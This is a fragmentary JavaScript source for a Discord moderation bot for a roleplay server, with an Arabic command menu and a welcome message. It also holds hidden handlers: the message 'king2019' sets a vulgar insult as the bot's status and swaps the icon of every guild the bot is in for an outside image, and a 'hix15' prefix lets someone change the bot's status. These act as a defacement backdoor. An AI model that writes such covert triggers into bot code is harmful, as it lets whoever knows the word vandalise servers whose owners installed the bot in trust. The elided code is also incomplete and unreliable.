...
LOka.on("message", message => {
  ...
  if (message.content.startsWith('hix15')) {
    ...
    if (message.content.startsWith(prefix + 'king2019')) {
    LOka.user.setStatus(argresult);
  }
});

LOka.on('message', message => {
     if (message.content === "king2019") {
LOka.user.setGame(`smart نايك امكم`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === "king2019") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/518138279367933967/591750860950863873/download.jpg`)
})
}
});
LOka.on('message', message => {
...
LOka.on('message', message => {
     if (message.content === "king2019") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/518138279367933967/591750860950863873/download.jpg`)
...
LOka.on('ready', () => {
   client.user.setGame("King Rp Bot !help");
}); 
...
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● 
👑『اوامر ادارية』👑
👑!members لتشوف الأعضاء
👑!clear تمسح شات
👑!settext عمل روم كتابي
👑!setvoice عمل روم صوتي
👑!ping معرفة بينق البوت
👑!avatar لتشوف صورتك
👑!id لتعرف معلوماتك
👑!botinfo معلومات لبوت
👑!kick طرد شخص
👑!ban تبنيد شخص
👑!unban فك لباند
👑!tempmute عطي ميوت صوتي
👑!untempmute فك ميوت صوتي
👑!mutechannel عدم تكلم بشات للجميع
👑!unmutechannel فك تكلم بشات لعام
👑!mute عطي ميوت
👑!unmute فك ميوت
● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ● 
BY Void.
...
LOka.on("guildMemberAdd", member => {
  ...
  return channel.send(`مرحبا بك في سيرفر الحياة الواقعية King Rp
